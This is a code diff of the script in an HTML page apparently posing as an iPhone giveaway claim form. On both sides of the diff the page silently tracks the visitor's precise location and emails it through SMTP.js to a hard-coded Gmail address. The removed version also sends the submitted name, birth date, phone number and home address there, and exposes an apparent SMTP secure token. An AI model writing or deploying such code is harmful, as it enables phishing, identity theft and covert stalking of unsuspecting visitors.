@@ -124,121 +124,68 @@
     <!-- JavaScript code -->
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const locationDisplay = document.getElementById("locationDisplay");
-            let lastSentPosition = null;
-
-            function calculateDistance(lat1, lon1, lat2, lon2) {
-                const R = 6371e3;
-                const φ1 = lat1 * Math.PI / 180;
-                const φ2 = lat2 * Math.PI / 180;
-                const Δφ = (lat2 - lat1) * Math.PI / 180;
-                const Δλ = (lon2 - lon1) * Math.PI / 180;
-
-                const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
-                          Math.cos(φ1) * Math.cos(φ2) *
-                          Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
-                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-
-                return R * c;
-            }
-
-            function sendEmail(subject, message, recipientEmail) {
-                Email.send({
-                    SecureToken: "C973D7AD-F097-4B95-91F4-40ABC5567812", // Replace with your secure token from SMTP.js
-                    To: recipientEmail,
-                    From: "khalilrodeni@gmail.com", // Replace with your email
-                    Subject: subject,
-                    Body: message,
-                })
-                .then(response => {
-                    if (response === "OK") {
-                        console.log("Email sent successfully");
-                        alert("Email sent successfully!");
-                    } else {
-                        console.error("Failed to send email:", response);
-                        alert("Error sending email: " + response);
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("Error sending email: " + error.message);
-                });
-            }
-
-            function sendLocationEmail(latitude, longitude) {
-                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
-                sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
-            }
-
-            function trackMovement() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.watchPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-
-                            if (lastSentPosition) {
-                                const distanceMoved = calculateDistance(
-                                    lastSentPosition.latitude,
-                                    lastSentPosition.longitude,
-                                    latitude,
-                                    longitude
-                                );
-
-                                if (distanceMoved > 50) {
-                                    sendLocationEmail(latitude, longitude);
-                                    lastSentPosition = { latitude, longitude };
-                                }
-                            } else {
-                                lastSentPosition = { latitude, longitude };
-                                sendLocationEmail(latitude, longitude);
-                            }
-                        },
-                        (error) => {
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    locationDisplay.textContent = "Location access denied by user.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    locationDisplay.textContent = "Location information is unavailable.";
-                                    break;
-                                case error.TIMEOUT:
-                                    locationDisplay.textContent = "Location request timed out.";
-                                    break;
-                                default:
-                                    locationDisplay.textContent = "An unknown error occurred.";
-                                    break;
-                            }
-                        },
-                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                    );
+    function sendEmail(subject, message, recipientEmail) {
+        try {
+            Email.send({
+                SecureToken: "YOUR_SMTPJS_SECURE_TOKEN", // Replace with your secure token
+                To: recipientEmail,
+                From: "your-email@example.com", // Replace with your email
+                Subject: subject,
+                Body: message,
+            })
+            .then(response => {
+                if (response === "OK") {
+                    alert("Email sent successfully!");
                 } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
+                    alert("Error sending email: " + response);
                 }
-            }
-
-            trackMovement();
-
-            document.getElementById("rewardForm").addEventListener("submit", function (e) {
-                e.preventDefault();
-
-                const fullName = document.getElementById("fullName").value;
-                const dob = document.getElementById("dob").value;
-                const email = document.getElementById("email").value;
-                const phoneNumber = document.getElementById("phoneNumber").value;
-                const address = document.getElementById("address").value;
-                const city = document.getElementById("city").value;
-                const postalCode = document.getElementById("postalCode").value;
-
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
-
-                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
-
-                alert("Thank you for your submission! We will contact you shortly.");
+            })
+            .catch(error => {
+                alert("Error sending email: " + error.message);
             });
-        });
-    </script>
+        } catch (error) {
+            alert("Unexpected error: " + error.message);
+        }
+    }
+
+    function sendLocationEmail(latitude, longitude) {
+        const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
+        sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
+    }
+
+    function trackMovement() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendLocationEmail(latitude, longitude);
+                },
+                (error) => {
+                    let errorMessage;
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = "Location access denied by user.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = "Location information is unavailable.";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = "Location request timed out.";
+                            break;
+                        default:
+                            errorMessage = "An unknown error occurred.";
+                    }
+                    alert(errorMessage);
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+            );
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    trackMovement();
+</script>
 </body>
 </html>
